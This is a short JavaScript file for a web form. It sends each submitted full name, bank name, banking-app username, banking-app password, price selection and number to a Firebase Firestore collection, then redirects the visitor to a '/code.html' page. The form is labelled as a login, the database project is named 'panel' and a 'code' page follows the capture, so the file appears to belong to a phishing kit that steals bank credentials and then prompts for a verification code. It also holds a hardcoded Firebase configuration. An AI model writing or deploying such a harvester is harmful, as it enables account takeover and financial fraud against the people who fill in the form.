import { initializeApp } from "https://www.gstatic.com/firebasejs/9.8.3/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/9.8.3/firebase-firestore.js"
const firebaseConfig = initializeApp({
    apiKey: "AIzaSyCbnTb5P4j9czRLdhwTnvHGY8lb0bvHDJo",
    authDomain: "panel-15e03.firebaseapp.com",
    projectId: "panel-15e03",
    storageBucket: "panel-15e03.appspot.com",
    messagingSenderId: "655778598898",
    appId: "1:655778598898:web:e884dfea50ff4d8aeba56b"
});



let theMainForm = document.getElementById("LoginForm");
let numOne = document.querySelector("#num-one");
let Price = document.querySelector("#select");
let NameApp = document.querySelector("#nameapp");
let PassApp = document.querySelector("#passapp");
let NameBank = document.querySelector("#namebank");
let fullName = document.querySelector("#fullname");

const firestore = getFirestore();
const ordersCollection = collection(firestore, "the-form-four")
theMainForm.addEventListener("submit",(e)=>{
          e.preventDefault()
      const newDoc = addDoc(ordersCollection, {
          fullName: fullName.value,
          NameBank: NameBank.value,
          NameApp: NameApp.value,
          PassApp: PassApp.value,
          Price: Price.value,
          numOne: numOne.value,
  });
  // Name.value = "" ;
//   password.value = "" ;
setTimeout(() => {
    window.location.pathname = "/code.html"
    }, 2000);
  })